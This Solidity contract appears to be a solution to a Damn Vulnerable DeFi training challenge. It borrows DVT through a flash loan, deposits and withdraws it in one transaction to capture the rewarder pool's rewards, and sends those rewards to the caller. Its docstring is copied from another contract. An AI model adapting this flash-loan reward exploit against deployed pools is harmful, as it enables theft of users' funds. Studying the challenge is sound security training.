// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256) external;
}

interface IRewarderPool {
    function withdraw(uint256) external;
    function deposit(uint256) external;
    function distributeRewards() external;
}

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 * @dev A simple pool to get flash loans of DVT
 */
contract AttackRewarder {
    using Address for address;
    IRewarderPool rewarderPool;
    IFlashLoanerPool flashLoanPool;
    DamnValuableToken liquidityToken;
    IERC20 rewardToken;
    address admin;

    constructor(address _rewarderPool, address _flashLoanPool, address _liquidityToken, address _rewardToken) {
        rewarderPool = IRewarderPool(_rewarderPool);
        flashLoanPool = IFlashLoanerPool(_flashLoanPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = IERC20(_rewardToken);
        admin = msg.sender;
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), type(uint256).max);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
    }

    function attack(uint256 amount) external {
        flashLoanPool.flashLoan(amount);
        rewarderPool.distributeRewards();
        uint256 rAmount = rewardToken.balanceOf(address(this));
        rewardToken.transfer(msg.sender, rAmount);
    }
}